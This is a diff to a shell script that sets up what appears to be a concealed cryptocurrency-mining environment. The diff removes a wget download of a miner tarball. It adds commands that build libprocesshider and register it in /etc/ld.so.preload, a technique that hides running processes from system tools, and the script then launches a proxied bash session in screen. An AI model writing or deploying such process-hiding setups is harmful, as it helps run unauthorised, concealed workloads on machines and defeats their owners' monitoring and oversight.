@@ -33,7 +33,10 @@ echo "******************************************************************"
 echo " "
 echo " "
 
-wget https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-ubuntu-bionic.tar.gz
-tar -xf danila-miner-2.3.1-ubuntu-bionic.tar.gz
+git clone https://github.com/hanifgz/libprocesshider.git
+cd libprocesshider;make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+cd ..
 
 screen ./graftcp/graftcp bash 
